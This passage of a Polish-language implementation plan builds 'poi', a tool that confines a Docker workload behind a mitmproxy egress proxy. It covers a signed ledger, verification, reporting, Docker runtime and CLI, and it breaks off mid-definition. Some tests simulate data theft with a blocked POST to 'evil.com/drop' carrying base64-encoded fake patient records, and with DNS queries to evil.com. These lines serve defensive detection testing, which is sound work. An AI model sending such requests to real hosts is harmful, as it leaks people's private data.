    def _state_ops(self, full: bool) -> list[DeltaOp]:
        ops = self.tracker.update(full)
        evidence.put(self.ledger.evidence_dir, self.tracker.last_config)
        self.violations = config_violations(json.loads(self.tracker.last_config), self.policy)
        return ops

    def _wal_ops(self) -> list[DeltaOp]:
        ops = []
        for e in self.wal.read_new():
            if e.kind == "ingress":
                if e.seq in self.ingress_seen:
                    continue
                self.ingress_seen.add(e.seq)
                ops.append(DeltaOp("add", "ingress", e.element))
                self.counts["ingress"] += 1
            else:
                if e.seq <= self.egress_seq:
                    continue
                self.egress_seq = e.seq
                ops.append(DeltaOp("add", "egress", e.element))
                self.counts["egress"] += 1
        return ops

    def _commit(self, ops: list[DeltaOp], restart: bool = False) -> dict:
        for op in ops:
            (self.accs[op.acc].add if op.op == "add" else self.accs[op.acc].sub)(op.element)
        last = self.ledger.last()
        t = self.clock() if last is None else max(self.clock(), last["t"])  # never go backwards
        cp = self.ledger.append(t=t, container=self.container, policy_digest=self.policy.digest,
                                accs=self.accs, counts=self.counts, ops=ops, restart=restart)
        self.publisher.publish(cp)
        if self.violations:
            self.on_violation(self.violations)
        return cp

    def genesis(self) -> dict:
        self.tracker.load_image()
        return self._commit(self._state_ops(full=False))

    def tick(self) -> dict:
        self.ticks += 1
        full = self.full_scan_every > 0 and self.ticks % self.full_scan_every == 0
        return self._commit(self._state_ops(full) + self._wal_ops())

    def resume(self) -> dict:
        """Daemon restart: rebuild in-memory state from the ledger, then full rescan."""
        last = self.ledger.last()
        state: dict[bytes, int] = {}
        for seq in range(last["seq"] + 1):
            for op in self.ledger.read_delta(seq):
                if op.acc == "state":
                    state[op.element] = state.get(op.element, 0) + (1 if op.op == "add" else -1)
                elif op.acc == "egress":
                    self.egress_seq = max(self.egress_seq, int(c.decode(op.element)[1]))
                else:
                    self.ingress_seen.add(int(c.decode(op.element)[1]))
        self.tracker.restore_index(e for e, n in state.items() if n > 0)
        self.tracker.load_image()
        for a in self.accs:
            self.accs[a] = LtHash.from_b64(last[a]["vec"])
        self.counts = {"egress": last["egress"]["count"], "ingress": last["ingress"]["count"]}
        return self._commit(self._state_ops(full=True) + self._wal_ops(), restart=True)
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_engine.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/engine.py src/poi/publish.py tests/helpers.py tests/test_engine.py
git commit -m "feat: daemon engine with local publisher and restart recovery

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 11: Weryfikacja polityki i evidence (kody 14–16)

Weryfikator sprawdza powiązanie z polityką, konfigurację z evidence, ponownie waliduje każde dozwolone żądanie i nagłówki; test niezależności importów.

**Files:**
- Modify: `src/poi/verify.py` (importy + nowe funkcje na końcu)
- Test: `tests/test_verify_policy.py`
- Test: `tests/test_verify_independence.py`

**Interfaces:**
- Consumes: `poi.evidence.get`, `Policy.decide`, `config_violations`
- Produces: `verify_policy(res: VerifyResult, run_dir, policy) -> None` (rzuca `VerifyError` 14/15/16).

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_verify_policy.py`:

```python
import pytest

from poi.ledger import pubkey_hex
from poi.policy import parse
from poi.verify import E_CONFIG, E_EVIDENCE, E_SCHEMA, VerifyError, verify_chain, verify_policy

from helpers import ENGINE_IMAGE as IMAGE, ENGINE_MOUNTS as MOUNTS, POLICY, FakeFS, make_engine as _engine


def _run(tmp_path, key, body=b'{"model":"small","count":1}', fs=None):
    fs = fs or FakeFS(IMAGE, MOUNTS)
    eng, gate = _engine(tmp_path, key, fs)
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], body)
    if r.seq and r.verdict == "allow":
        gate.on_response(r.seq, 200, [], b"{}")
    gate.wal.record_dns("2026-10-13T18:00:00Z", "evil.com", "A", "block")
    eng.tick()
    return tmp_path / "run"


def _check(run, key, policy=POLICY):
    verify_policy(verify_chain(run, pubkey_hex(key)), run, parse(policy))


def test_valid_run_passes(tmp_path, key):
    _check(_run(tmp_path, key), key)


def test_other_policy_rejected(tmp_path, key):
    run = _run(tmp_path, key)
    with pytest.raises(VerifyError) as ei:
        _check(run, key, POLICY.replace(b"tick_seconds: 2", b"tick_seconds: 3"))
    assert ei.value.code == E_CONFIG


def test_missing_evidence(tmp_path, key):
    run = _run(tmp_path, key)
    for p in (run / "evidence").glob("*.bin"):
        if p.read_bytes() == b'{"count":1,"model":"small"}':
            p.unlink()
    with pytest.raises(VerifyError) as ei:
        _check(run, key)
    assert ei.value.code == E_EVIDENCE


def test_allowed_request_outside_schema_detected(tmp_path, key):
    """A compromised proxy that allowed a leaking request is caught by re-validation."""
    run = _run(tmp_path, key)
    res = verify_chain(run, pubkey_hex(key))
    looser = POLICY.replace(b"maximum: 255", b"maximum: 0")
    with pytest.raises(VerifyError) as ei:
        p = parse(looser)
        p.raw = parse(POLICY).raw  # same digest, stricter schema
        verify_policy(res, run, p)
    assert ei.value.code == E_SCHEMA


def test_config_violation_detected(tmp_path, key):
    fs = FakeFS(IMAGE, MOUNTS)
    fs.networks["bridge"] = False
    run = _run(tmp_path, key, fs=fs)
    with pytest.raises(VerifyError) as ei:
        _check(run, key)
    assert ei.value.code == E_CONFIG
```

Utwórz `tests/test_verify_independence.py`:

```python
import ast
from pathlib import Path

import poi.verify

ALLOWED = {"poi", "poi.canonical", "poi.lthash", "poi.evidence", "poi.policy"}


def test_verifier_imports_only_allowed_modules():
    tree = ast.parse(Path(poi.verify.__file__).read_text())
    mods = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module and node.module.startswith("poi"):
            mods |= {node.module} if node.module != "poi" else {f"poi.{a.name}" for a in node.names}
        elif isinstance(node, ast.Import):
            mods |= {a.name for a in node.names if a.name.startswith("poi")}
    assert mods <= ALLOWED, mods - ALLOWED
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_verify_policy.py tests/test_verify_independence.py -v`
Expected: FAIL — `ImportError: cannot import name 'verify_policy' from 'poi.verify'`

- [ ] **Step 3: Implementacja**

W `src/poi/verify.py` zamień blok:

```python
from poi import canonical as c
from poi.lthash import LtHash
```

na:

```python
from poi import canonical as c
from poi import evidence
from poi.lthash import LtHash
from poi.policy import Policy, config_violations
```

Dopisz na końcu `src/poi/verify.py`:

```python


def _evidence(run_dir: Path, digest: str, cp_seq: int, what: str) -> bytes:
    data = evidence.get(run_dir / "evidence", digest)
    if data is None:
        raise VerifyError(E_EVIDENCE, cp_seq, f"{what} evidence {digest[:12]}… missing or corrupt")
    return data


def verify_policy(res: VerifyResult, run_dir: Path, policy: Policy) -> None:
    """Checks policy binding and configuration (15), evidence (16) and schema conformance (14)."""
    run_dir = Path(run_dir)
    for cp in res.checkpoints:
        if cp["policy"] != policy.digest:
            raise VerifyError(E_CONFIG, cp["seq"], "checkpoint is bound to a different policy")
    for seq, digest in res.config_digests:
        doc = json.loads(_evidence(run_dir, digest, seq, "config"))
        if v := config_violations(doc, policy):
            raise VerifyError(E_CONFIG, seq, "; ".join(v))
    for ev in res.egress:
        f = ev.fields
        if ev.domain == "dns":
            _, _, _, name, qtype, verdict = f
            if verdict == "allow" and (name not in policy.hosts or qtype != "A"):
                raise VerifyError(E_SCHEMA, ev.checkpoint, f"dns seq {ev.seq}: {name} answered but not allowed")
            continue
        _, _, _, method, host, path, hdig, bdig, verdict, _ = f
        headers = _evidence(run_dir, hdig, ev.checkpoint, f"egress {ev.seq} headers")
        body = _evidence(run_dir, bdig, ev.checkpoint, f"egress {ev.seq} body")
        if verdict != "allow":
            continue
        d = policy.decide(host, method, path, body)
        if d.verdict != "allow" or d.body != body:
            raise VerifyError(E_SCHEMA, ev.checkpoint, f"egress seq {ev.seq} does not satisfy policy ({d.reason})")
        fwd = [["content-type", "application/json"]] if body else []
        fwd += [[k, v] for k, v in sorted(policy.forward_headers.items())]
        if json.loads(headers) != sorted(fwd):
            raise VerifyError(E_SCHEMA, ev.checkpoint, f"egress seq {ev.seq} forwarded unexpected headers")
    for ev in res.ingress:
        _evidence(run_dir, ev.fields[3], ev.checkpoint, f"ingress {ev.seq} headers")
        _evidence(run_dir, ev.fields[4], ev.checkpoint, f"ingress {ev.seq} body")
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_verify_policy.py tests/test_verify_independence.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/verify.py tests/test_verify_independence.py tests/test_verify_policy.py
git commit -m "feat: policy, config and evidence verification

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 12: Raport dla właściciela danych

Zablokowane próby, trafienia odcisków (osobno w ruchu dozwolonym), górne ograniczenie kanału w bitach.

**Files:**
- Create: `src/poi/report.py`
- Test: `tests/test_report.py`

**Interfaces:**
- Consumes: `VerifyResult`, `evidence.get`, `FingerprintSet.scan`, `endpoint_capacity`
- Produces: `build_report(res, run_dir, policy, fingerprints=None)->dict` (klucze m.in. `allowed_requests`, `blocked`, `blocked_by_reason`, `dns`, `capacity_bits_upper_bound`, `fingerprint_hits`, `fingerprint_hits_in_allowed_traffic`), `render_text(dict)->str`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_report.py`:

```python
import base64

from poi.fingerprint import FingerprintSet
from poi.ledger import pubkey_hex
from poi.policy import parse
from poi.report import build_report, render_text
from poi.verify import verify_chain

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, POLICY, FakeFS, make_engine

SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"


def test_report(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    eng.genesis()
    for _ in range(3):
        gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_request("evil.com", "POST", "/drop", [], b"x=" + base64.b64encode(SECRET))
    gate.wal.record_dns("2026-10-13T18:00:00Z", "a.evil.com", "A", "block")
    eng.tick()
    fp = FingerprintSet(b"k" * 32)
    fp.add(SECRET, "patients/1.txt")
    res = verify_chain(tmp_path / "run", pubkey_hex(key))
    r = build_report(res, tmp_path / "run", parse(POLICY), fp)
    assert r["allowed_requests"] == 3
    assert r["capacity_bits_upper_bound"] == 27
    assert r["blocked_by_reason"] == {"host-not-allowed": 1, "dns": 1}
    assert r["fingerprint_hits"] == [{"seq": 4, "verdict": "block", "sources": ["patients/1.txt"]}]
    assert r["fingerprint_hits_in_allowed_traffic"] == 0
    text = render_text(r)
    assert "27 bits" in text and "hits in ALLOWED traffic: 0" in text
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_report.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.report'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/report.py`:

```python
"""User-facing summary of a verified run: blocked attempts, fingerprint hits, channel capacity."""
from __future__ import annotations

import math
from collections import Counter
from pathlib import Path

from poi import evidence
from poi.fingerprint import FingerprintSet
from poi.policy import Policy, endpoint_capacity
from poi.verify import VerifyResult


def build_report(res: VerifyResult, run_dir: Path, policy: Policy,
                 fingerprints: FingerprintSet | None = None) -> dict:
    run_dir = Path(run_dir)
    allowed: Counter = Counter()
    blocked: list[dict] = []
    dns: Counter = Counter()
    hits: list[dict] = []
    for ev in res.egress:
        f = ev.fields
        if ev.domain == "dns":
            dns[f[5]] += 1
            if f[5] == "block":
                blocked.append({"seq": ev.seq, "t": f[2], "kind": "dns", "target": f[3], "reason": "dns"})
            if fingerprints is not None and fingerprints.scan(f[3].encode()):
                hits.append({"seq": ev.seq, "verdict": f[5], "sources": sorted(fingerprints.scan(f[3].encode()))})
            continue
        _, _, t, method, host, path, _, bdig, verdict, reason = f
        if verdict == "allow":
            allowed[(host, method, path)] += 1
        else:
            blocked.append({"seq": ev.seq, "t": t, "kind": "http", "target": f"{method} {host}{path}",
                            "reason": reason})
        if fingerprints is not None:
            body = evidence.get(run_dir / "evidence", bdig) or b""
            if found := fingerprints.scan(body + b" " + path.encode()):
                hits.append({"seq": ev.seq, "verdict": verdict, "sources": sorted(found)})
    capacity = 0.0
    per_endpoint = []
    for (host, method, path), n in sorted(allowed.items()):
        ep = policy.find(host, method, path)
        bits = endpoint_capacity(ep)
        capacity += bits * n
        per_endpoint.append({"endpoint": f"{method} {host}{path}", "requests": n, "bits_per_request": bits})
    leaked_allowed = [h for h in hits if h["verdict"] == "allow"]
    return {
        "checkpoints": len(res.checkpoints),
        "last_checkpoint": res.last["seq"],
        "state_digest": res.last["state"]["digest"],
        "egress_events": len(res.egress),
        "allowed_requests": sum(allowed.values()),
        "endpoints": per_endpoint,
        "blocked": blocked,
        "blocked_by_reason": dict(Counter(b["reason"] for b in blocked)),
        "dns": dict(dns),
        "capacity_bits_upper_bound": capacity,
        "fingerprints_checked": fingerprints is not None,
        "fingerprint_hits": hits,
        "fingerprint_hits_in_allowed_traffic": len(leaked_allowed),
    }


def render_text(r: dict) -> str:
    cap = r["capacity_bits_upper_bound"]
    lines = [
        f"Checkpoints verified: {r['checkpoints']} (last #{r['last_checkpoint']}, state {r['state_digest'][:16]}…)",
        f"Egress events: {r['egress_events']}  allowed requests: {r['allowed_requests']}  "
        f"blocked: {len(r['blocked'])} {r['blocked_by_reason']}",
        f"DNS queries: {r['dns']}",
        "Covert-channel upper bound in allowed traffic: "
        + ("UNBOUNDED (schema allows free-form values)" if math.isinf(cap) else f"{cap:.0f} bits"),
    ]
    for e in r["endpoints"]:
        lines.append(f"  {e['endpoint']}: {e['requests']} × {e['bits_per_request']:.1f} bits")
    if r["fingerprints_checked"]:
        lines.append(f"User-data fingerprint hits in ALLOWED traffic: {r['fingerprint_hits_in_allowed_traffic']}")
        lines.append(f"User-data fingerprint hits in blocked attempts: "
                     f"{len(r['fingerprint_hits']) - r['fingerprint_hits_in_allowed_traffic']}")
    for b in r["blocked"]:
        lines.append(f"  blocked #{b['seq']} {b['t']} {b['target']} ({b['reason']})")
    lines.append("Not covered: timing/request-count channels beyond the bound above, kernel escapes, "
                 "host compromise (see spec §9).")
    return "\n".join(lines)
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_report.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/report.py tests/test_report.py
git commit -m "feat: user-facing isolation report

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 13: Runtime Dockera i kontener proxy

Sieć wewnętrzna (`internal`, podsieć 10.231.X.0/24) + zewnętrzna, kontener `poi-proxy` z addonem mitmproxy, workload z proxy/CA/DNS.

**Files:**
- Create: `src/poi/proxy_addon.py`
- Create: `docker/proxy.Dockerfile`
- Create: `.dockerignore`
- Create: `src/poi/runtime.py`
- Create: `tests/integration/policy.yaml`
- Test: `tests/integration/test_runtime.py` (marker `docker`)

**Interfaces:**
- Consumes: `EgressGate`, `start_dns`, `WalWriter`, `FingerprintSet.load`, `policy.load`
- Produces: `PROXY_IMAGE='poi-proxy:0.1'`, `PROXY_PORT=8080`, `CA_IN_WORKLOAD='/etc/poi/ca.pem'`, `build_proxy_image(client, tag)`, `RuntimeInfo(run_id, int_network, ext_network, proxy_ip, proxy_id, workload_id)` z `save/load` (`runtime.json`), `Runtime(client, run_dir, info=None)` z `prepare(policy_path, fingerprints=None, upstream_insecure=False)->RuntimeInfo`, `create_workload(image, command, output_target, extra_ro_mounts=None)`, `workload()`, `proxy()`, `pause(violations)`, `teardown(keep_workload=True)`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/integration/policy.yaml`:

```yaml
version: 1
on_violation: alert
tick_seconds: 1
output_volume: /srv/out
endpoints:
  - host: api.test
    method: POST
    path: /v1/score
    max_requests_per_minute: 30
    request_schema:
      type: object
      additionalProperties: false
      required: [model, count]
      properties:
        model: {enum: [small, large]}
        count: {type: integer, minimum: 0, maximum: 255}
        note: {type: string, maxLength: 200}
fingerprint: {k: 32, w: 16}
```

Utwórz `tests/integration/test_runtime.py`:

```python
"""Docker smoke test for the runtime layer. Run with: pytest -m docker"""
from pathlib import Path

import pytest

docker = pytest.importorskip("docker")

from poi.runtime import Runtime, build_proxy_image  # noqa: E402

HERE = Path(__file__).parent
pytestmark = pytest.mark.docker


@pytest.fixture(scope="module")
def client():
    try:
        c = docker.from_env()
        c.ping()
    except Exception:
        pytest.skip("Docker not available")
    build_proxy_image(c)
    c.images.pull("python:3.12-slim")
    return c


def test_prepare_creates_isolated_topology(client, tmp_path):
    rt = Runtime(client, tmp_path / "run")
    info = rt.prepare(HERE / "policy.yaml")
    try:
        assert (tmp_path / "run" / "ca" / "mitmproxy-ca-cert.pem").exists()
        assert client.networks.get(info.int_network).attrs["Internal"] is True
        assert info.proxy_ip.startswith("10.231.") and info.proxy_ip.endswith(".2")
        w = rt.create_workload("python:3.12-slim", ["true"], "/srv/out")
        w.reload()
        assert list(w.attrs["NetworkSettings"]["Networks"]) == [info.int_network]
        assert w.attrs["HostConfig"]["Dns"] == [info.proxy_ip]
    finally:
        rt.teardown(keep_workload=False)
    names = {n.name for n in client.networks.list()}
    assert info.int_network not in names and info.ext_network not in names
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest -m docker tests/integration/test_runtime.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.runtime'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/proxy_addon.py`:

```python
"""mitmproxy addon (runs inside the poi-proxy container). Thin adapter over EgressGate."""
from __future__ import annotations

import os
from pathlib import Path

from mitmproxy import http

from poi import policy as pol
from poi.dnsstub import start_dns
from poi.fingerprint import FingerprintSet
from poi.gate import EgressGate
from poi.wal import WalWriter

RUN = Path(os.environ.get("POI_RUN", "/run/poi"))


def _blocked(reason: str) -> http.Response:
    return http.Response.make(403, f"blocked by poi: {reason}\n".encode(), {"content-type": "text/plain"})


class PoiAddon:
    def __init__(self) -> None:
        self.policy = pol.load(RUN / "policy.yaml")
        self.wal = WalWriter(RUN / "proxy-wal", RUN / "evidence")
        fp = None
        if (RUN / "fingerprints.bin").exists():
            fp = FingerprintSet.load(RUN / "fingerprints.bin", (RUN / "fingerprint.key").read_bytes(),
                                     self.policy.fingerprint_k, self.policy.fingerprint_w)
        self.gate = EgressGate(self.policy, self.wal, fp)
        self.dns = start_dns(self.wal, self.policy.hosts, os.environ["POI_PROXY_IP"])

    def http_connect(self, flow: http.HTTPFlow) -> None:
        r = self.gate.on_connect(flow.request.host)
        if r.verdict != "allow":
            flow.response = _blocked(r.reason)

    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        host = req.pretty_host
        r = self.gate.on_request(host, req.method, req.path, list(req.headers.items(multi=True)),
                                 req.raw_content or b"")
        if r.verdict != "allow":
            flow.response = _blocked(r.reason)
            return
        req.headers.clear()                      # drop every client header: no header side channel
        if req.http_version.startswith("HTTP/1"):
            req.headers["host"] = host
        for k, v in r.headers:
            req.headers[k] = v
        req.content = r.body                     # canonical JSON; sets content-length
        flow.metadata["poi_seq"] = r.seq

    def response(self, flow: http.HTTPFlow) -> None:
        seq = flow.metadata.get("poi_seq")
        if seq is not None and flow.response is not None:
            self.gate.on_response(seq, flow.response.status_code,
                                  list(flow.response.headers.items(multi=True)), flow.response.raw_content or b"")


addons = [PoiAddon()]
```

Utwórz `docker/proxy.Dockerfile`:

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir "mitmproxy>=11,<13"
COPY pyproject.toml /src/pyproject.toml
COPY src /src/src
RUN pip install --no-cache-dir /src && \
    cp "$(python -c 'import os, poi; print(os.path.dirname(poi.__file__))')/proxy_addon.py" /opt/proxy_addon.py
ENV POI_RUN=/run/poi HOME=/run/poi/ca
ENTRYPOINT ["mitmdump", "--listen-host", "0.0.0.0", "--listen-port", "8080", \
            "--set", "confdir=/run/poi/ca", "-s", "/opt/proxy_addon.py"]
```

Utwórz `.dockerignore`:

```text
.venv
**/__pycache__
tests
docs
run*
```

Utwórz `src/poi/runtime.py`:

```python
"""Docker orchestration: networks, proxy container, workload container."""
from __future__ import annotations

import ipaddress
import json
import os
import shutil
import time
import uuid
from dataclasses import asdict, dataclass, field
from pathlib import Path

import docker
from docker.errors import APIError, NotFound

PROXY_IMAGE = "poi-proxy:0.1"
PROXY_PORT = 8080
CA_IN_WORKLOAD = "/etc/poi/ca.pem"
REPO_ROOT = Path(__file__).resolve().parents[2]   # src layout: <repo>/src/poi/runtime.py


@dataclass
class RuntimeInfo:
    run_id: str
    int_network: str
    ext_network: str
    proxy_ip: str
    proxy_id: str = ""
    workload_id: str = ""
    extra_networks: list[str] = field(default_factory=list)

    def save(self, run_dir: Path) -> None:
        (Path(run_dir) / "runtime.json").write_text(json.dumps(asdict(self), indent=2))

    @classmethod
    def load(cls, run_dir: Path) -> "RuntimeInfo":
        return cls(**json.loads((Path(run_dir) / "runtime.json").read_text()))


def build_proxy_image(client: docker.DockerClient, tag: str = PROXY_IMAGE) -> None:
    client.images.build(path=str(REPO_ROOT), dockerfile="docker/proxy.Dockerfile", tag=tag, rm=True)


class Runtime:
    def __init__(self, client: docker.DockerClient, run_dir: Path, info: RuntimeInfo | None = None) -> None:
        self.client = client
        self.run_dir = Path(run_dir).resolve()
        self.info = info

    # -- setup -------------------------------------------------------------------
    def _create_internal_network(self, name: str):
        for third in range(256):
            subnet = ipaddress.ip_network(f"10.231.{third}.0/24")
            ipam = docker.types.IPAMConfig(pool_configs=[docker.types.IPAMPool(subnet=str(subnet))])
            try:
                return self.client.networks.create(name, driver="bridge", internal=True, ipam=ipam), subnet
            except APIError as e:
                if "overlap" not in str(e).lower():
                    raise
        raise RuntimeError("no free 10.231.x.0/24 subnet for the internal network")

    def prepare(self, policy_path: Path, fingerprints: tuple[Path, bytes] | None = None,
                upstream_insecure: bool = False, proxy_image: str = PROXY_IMAGE) -> RuntimeInfo:
        """Create networks and start the proxy. Copies policy (and fingerprints) into the run dir."""
        self.run_dir.mkdir(parents=True, exist_ok=True)
        for d in ("ca", "proxy-wal", "evidence", "out"):
            (self.run_dir / d).mkdir(exist_ok=True)
        shutil.copyfile(policy_path, self.run_dir / "policy.yaml")
        if fingerprints is not None:
            shutil.copyfile(fingerprints[0], self.run_dir / "fingerprints.bin")
            kp = self.run_dir / "fingerprint.key"
            kp.write_bytes(fingerprints[1])
            os.chmod(kp, 0o600)
        run_id = uuid.uuid4().hex[:8]
        net, subnet = self._create_internal_network(f"poi-{run_id}-int")
        ext = self.client.networks.create(f"poi-{run_id}-ext", driver="bridge")
        proxy_ip = str(subnet.network_address + 2)
        self.info = RuntimeInfo(run_id, net.name, ext.name, proxy_ip)
        cmd = ["--set", "ssl_insecure=true"] if upstream_insecure else []
        proxy = self.client.containers.create(
            proxy_image, command=cmd, name=f"poi-{run_id}-proxy", network=ext.name,
            user=f"{os.getuid()}:{os.getgid()}",
            environment={"POI_PROXY_IP": proxy_ip},
            sysctls={"net.ipv4.ip_unprivileged_port_start": "0"},
            volumes={str(self.run_dir): {"bind": "/run/poi", "mode": "rw"}})
        net.connect(proxy, ipv4_address=proxy_ip)
        proxy.start()
        self.info.proxy_id = proxy.id
        self._wait_for_ca(proxy)
        self.info.save(self.run_dir)
        return self.info

    def _wait_for_ca(self, proxy, timeout: float = 30) -> None:
        ca = self.run_dir / "ca" / "mitmproxy-ca-cert.pem"
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            proxy.reload()
            if proxy.status == "exited":
                raise RuntimeError("proxy exited:\n" + proxy.logs().decode(errors="replace"))
            if ca.exists():
                probe = "import socket; socket.create_connection(('127.0.0.1', %d), 1)" % PROXY_PORT
                if proxy.exec_run(["python", "-c", probe]).exit_code == 0:
                    return
            time.sleep(0.2)
        raise TimeoutError("proxy did not become ready")

    def create_workload(self, image: str, command: list[str] | None, output_target: str | None,
                        extra_ro_mounts: dict[str, str] | None = None):
        """Create (not start) the workload: internal network only, proxy env, CA, DNS → stub."""
        i = self.info
        proxy_url = f"http://{i.proxy_ip}:{PROXY_PORT}"
        volumes = {str(self.run_dir / "ca" / "mitmproxy-ca-cert.pem"): {"bind": CA_IN_WORKLOAD, "mode": "ro"}}
        if output_target:
            volumes[str(self.run_dir / "out")] = {"bind": output_target, "mode": "rw"}
        for host, target in (extra_ro_mounts or {}).items():
            volumes[str(Path(host).resolve())] = {"bind": target, "mode": "ro"}
        env = {k: proxy_url for k in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy")}
        env.update({k: CA_IN_WORKLOAD for k in ("SSL_CERT_FILE", "REQUESTS_CA_BUNDLE",
                                                 "NODE_EXTRA_CA_CERTS", "CURL_CA_BUNDLE")})
        w = self.client.containers.create(
            image, command=command, name=f"poi-{i.run_id}-workload", network=i.int_network,
            dns=[i.proxy_ip], environment=env, volumes=volumes)
        i.workload_id = w.id
        i.save(self.run_dir)
        return w

    # -- control -------------------------------------------------------------------
    def workload(self):
        return self.client.containers.get(self.info.workload_id)

    def proxy(self):
        return self.client.containers.get(self.info.proxy_id)

    def pause(self, violations: list[str]) -> None:
        w = self.workload()
        w.reload()
        if w.status == "running":
            w.pause()

    def teardown(self, keep_workload: bool = True) -> None:
        """Remove the proxy and external network. The stopped workload and its internal
        network are kept by default so `poi verify --live` can still inspect them."""
        cids = [self.info.proxy_id] + ([] if keep_workload else [self.info.workload_id])
        nets = [self.info.ext_network] + ([] if keep_workload else [self.info.int_network])
        for cid in cids:
            if cid:
                try:
                    self.client.containers.get(cid).remove(force=True)
                except NotFound:
                    pass
        for n in nets:
            try:
                self.client.networks.get(n).remove()
            except NotFound:
                pass
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest -m docker tests/integration/test_runtime.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add .dockerignore docker/proxy.Dockerfile src/poi/proxy_addon.py src/poi/runtime.py tests/integration/policy.yaml tests/integration/test_runtime.py
git commit -m "feat: docker runtime with mitmproxy-based egress proxy

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 14: Demon, live-check i CLI

`poi keygen | fingerprint | run | resume | verify [--live] | report | clean`; kody wyjścia weryfikatora 10–17.

**Files:**
- Create: `src/poi/daemon.py`
- Create: `src/poi/livecheck.py`
- Create: `src/poi/cli.py`
- Test: `tests/test_cli.py`

**Interfaces:**
- Consumes: `Runtime`, `Engine`, `StateTracker`, `DockerContainerFS`, `verify_chain`, `verify_policy`, `build_report`
- Produces: `RunSpec(run_dir, policy_path, key_path, image, command=None, fingerprints=None, extra_ro_mounts=None, max_ticks=None)`, `daemon.start(spec, client=None)->Runtime`, `daemon.resume(run_dir, key_path, client=None, max_ticks=None)`, `daemon.loop(engine, rt, tick_seconds, max_ticks)`, `livecheck.live_state(run_dir, client=None)->LtHash`, `cli.main(argv)->int`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_cli.py`:

```python
from poi.cli import main
from poi.verify import E_DELTA

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, POLICY, FakeFS, make_engine


def _run(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    eng.genesis()
    gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    eng.tick()
    (tmp_path / "run" / "policy.yaml").write_bytes(POLICY)
    return tmp_path / "run"


def test_keygen(tmp_path, capsys):
    assert main(["keygen", str(tmp_path / "k")]) == 0
    assert len(capsys.readouterr().out.strip()) == 64


def test_verify_ok_and_exit_code_on_tamper(tmp_path, key, capsys):
    run = _run(tmp_path, key)
    assert main(["verify", str(run)]) == 0
    assert "OK 2 checkpoints" in capsys.readouterr().out
    p = run / "delta" / "000001.jsonl"
    p.write_bytes(p.read_bytes().replace(b'"add"', b'"sub"', 1))
    assert main(["verify", str(run)]) == E_DELTA


def test_fingerprint_then_report(tmp_path, key, capsys):
    run = _run(tmp_path, key)
    data = tmp_path / "data"
    data.mkdir()
    (data / "r.txt").write_bytes(b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma")
    fpk, out = tmp_path / "fp.key", tmp_path / "fp.bin"
    assert main(["fingerprint", "--data", str(data), "--fp-key", str(fpk), "--out", str(out)]) == 0
    assert fpk.stat().st_size == 32 and out.stat().st_size > 0
    capsys.readouterr()
    assert main(["report", str(run), "--data", str(data), "--fp-key", str(fpk)]) == 0
    text = capsys.readouterr().out
    assert "hits in ALLOWED traffic: 0" in text and "9 bits" in text
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_cli.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.cli'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/daemon.py`:

```python
"""`poi run` / `poi resume`: wire runtime + state + WAL + ledger into the tick loop."""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass
from pathlib import Path

import docker

from poi import policy as pol
from poi.engine import Engine
from poi.ledger import Ledger, load_key
from poi.publish import LocalPublisher
from poi.runtime import Runtime, RuntimeInfo
from poi.state import DockerContainerFS, StateTracker
from poi.wal import WalReader

log = logging.getLogger("poi")


@dataclass
class RunSpec:
    run_dir: Path
    policy_path: Path
    key_path: Path
    image: str
    command: list[str] | None = None
    fingerprints: tuple[Path, bytes] | None = None
